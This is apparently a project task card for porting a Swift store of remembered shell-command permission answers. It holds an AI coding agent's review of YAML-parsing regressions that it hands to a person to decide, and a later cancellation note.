    The fail-open whole-collection decode is gone, and the deny-wins test now covers each of the six ordered scope pairs. The emitter is byte for byte the same as the encoder it replaced, over 69 key shapes. The write stays atomic. To drop `Sendable` is safe, and the Swift 6 language mode checks it.

    **But the fix traded one defect for a worse class of defect.** Four of the ten findings are REGRESSIONS that this commit introduced. The old `YAMLDecoder` path read each of these files correctly:

    1. A merge key at the root hides `decisions:` completely. `Yams.compose` never calls `Mapping.flatten()`; the decoder did. Nothing throws, thus nothing warns. **This is a SILENT fail-open. It is worse than the defect this commit closed, which at least warned.**
    2. A merge key inside `decisions:` turns each merged refusal into one unknown entry keyed `<<`, thus the warning never names the command.
    3. `decisions:` with nothing under it throws. That is the documented way for a person to cancel their last answer, and the layer now becomes permanently unwritable.
    4. A write can emit two keys of the same text and **corrupt the file for ever**. The dedupe compares scalar text; the parser compares whole nodes, tag included. With `yes:` and `"yes":` in one file, any later `remember` writes a duplicate key and each read after that throws.

    **Why I stop the loop here.** The card asked "can the new error cases lose an entry?" The answer today is yes — a `decisions:` that holds a sequence of mappings visibly carries a refusal, and the store drops it. To answer the remaining ten items one at a time is to re-implement a YAML reader: merge keys, anchors, tags, multi-document, duplicate keys, flow collections, folded scalars and comments each need handling, and each one is a place a refusal can go missing.

    That is an approach decision, not a defect list, and it belongs to a person.

    **The two ways forward:**

    **A. Go back to Yams for the shape of the file, and decode the entries one at a time inside it.** Keep `YAMLDecoder`, and give `ShellDecisionFile` an `init(from:)` that reads `decisions:` as a container of nodes and sorts each entry itself. Yams keeps merge-key flattening, multi-document handling and duplicate-key rules, and the store keeps the per-entry tolerance that the fail-open fix needs. This is the smaller change and it re-uses a tested library.

    **B. Keep the hand-built reader, and answer each of the ten findings.** More control, and more surface. The store then owns a YAML subset for as long as this file lives.

    **The state of the tree right now.** Commit 305d1cd stands. Judged against the committed parent it is better in one way — the reproduced fail-open is fixed and the tests cover it — and worse in another: finding 1 is silent where the old one warned. Say the word and I revert 305d1cd, or I take approach A.

    **Also open, and not this card's fault:** `../FoundationModelsShelltool/Sources/ShellTool/ShellDecisionStore.swift` still carries the ORIGINAL fail-open. Both packages read the same layer files. A card is filed on that board.
  timestamp: 2026-08-23T01:13:38.838578+00:00
- actor: claude-code
  id: 01m0svd5tzergwd7mbfy4jhpc9
  text: |-
    ### Cancelled by decision 2026-08-24 — the shell has no ask-permission semantics

    The seatbelt sandbox is the only gate on what a shell command may do. No
    question is ever asked, thus a store of remembered answers has no reason to
    exist. The stuck A-versus-B YAML question is void with it.

    Replaced by `^6e4x8nw` (delete the store and the remembered-answer machinery).
    The reason and the limit of this posture go into `eventplan.md` under
    `^pqe3khv`.

    Archived, not deleted: the review history here — the fail-open decode, the
    merge-key regressions, the duplicate-key corruption — is the record of why a
    hand-built YAML reader was the wrong path, and the sibling
    `FoundationModelsShelltool` still carries the original fail-open.
  timestamp: 2026-08-24T12:19:59.455936+00:00
depends_on:
- 01M0NAF9VBHGY2DFNM5PFA3DER
position_column: doing
position_ordinal: '8180'
title: Port ShellDecisionStore, the remembered answer store
---
## What

Port the store that remembers a user answer to an `ask` decision. eventplan.md
§ "Consolidation of the siblings" says the remembered-"always" store *works as
designed* once elicitation is available. It cannot work today, because the tool
cannot speak to a person.

Port the store now. The elicitation task that follows makes it live.

- Create `Sources/FoundationModelsMultitool/Capabilities/Shell/ShellDecisionStore.swift`
  from `../FoundationModelsShelltool/Sources/ShellTool/ShellDecisionStore.swift`
  (888 lines).
- Keep the on-disk format. A store that Shelltool wrote must still be readable.
- The file imports `Yams` and `Darwin`. It must not import `Operations`.

## Acceptance Criteria

- [ ] `ShellDecisionStore` is in
      `Sources/FoundationModelsMultitool/Capabilities/Shell/`.
- [ ] A remembered "always allow" answer for a command makes the next
      identical command allow with no second question.
- [ ] A remembered "always deny" answer denies.
- [ ] The on-disk format is unchanged from Shelltool.
- [ ] The file does not import `Operations`.

## Tests

- [ ] New `Tests/FoundationModelsMultitoolTests/ShellDecisionStoreTests.swift`,
      ported from the Shelltool tests that cover the store.
- [ ] A test writes a store file, reads it back, and asserts the remembered
      answer applies.
- [ ] A test reads a fixture file in the Shelltool on-disk format, to prove
      the format did not drift.
- [ ] `swift test --filter ShellDecisionStore` passes.
- [ ] `swift test` passes with no new failure and no new warning.

## Workflow
- Use `/tdd` — write failing tests first, then implement to make them pass. #phase-2 #eventplan #stuck